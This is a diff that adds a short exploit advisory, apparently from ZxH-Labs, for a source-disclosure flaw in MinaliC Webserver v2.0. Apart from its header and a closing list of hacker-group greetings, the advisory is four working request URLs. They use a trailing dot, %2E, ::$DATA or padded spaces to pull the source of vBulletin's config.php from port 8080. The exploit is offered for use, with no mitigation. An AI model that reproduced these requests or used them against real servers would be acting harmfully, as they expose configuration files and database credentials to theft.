@@ -1,0 +1,24 @@
+$b0x# MinaliC Webserver v2.0 Remote Source Disclosure
+$b0x# 2.0
+$b0x# 10th-Nov-11
+$b0x# ZxH-Labs
+$b0x# MC-WS0111
+$b0x# Tested On Windows IIS 2003
+$b0x# http://sourceforge.net/projects/minalic/
+
+=============================================
+This Bug Allows You To Get Source Codes Of Scripts OF System
+Which Has This Program As A Webserver  .
+8080 : As Default PORT Service 
+=============================================
+
+
+http://[IP]:8080/vBulletin/includes/config.php.
+http://[IP]:8080/vBulletin/includes/config.php%2E
+http://[IP]:8080/vBulletin/includes/config.php::$DATA
+http://[IP]:8080/vBulletin/includes/config.php%20%20%20%20%20
+
+=============================================
+Greet'z 2 SqL_Mast3r | Mr.L4iv3 | I-Hmx | Sec4ever | The Injector
+Red Virus | T0R0B0XHACKER | X-Shadow | TNT_HACKER | Lagripe-DZ
+OFFSEC | S4S | r1z | Iranian Data Coder | Iranian Black Hat
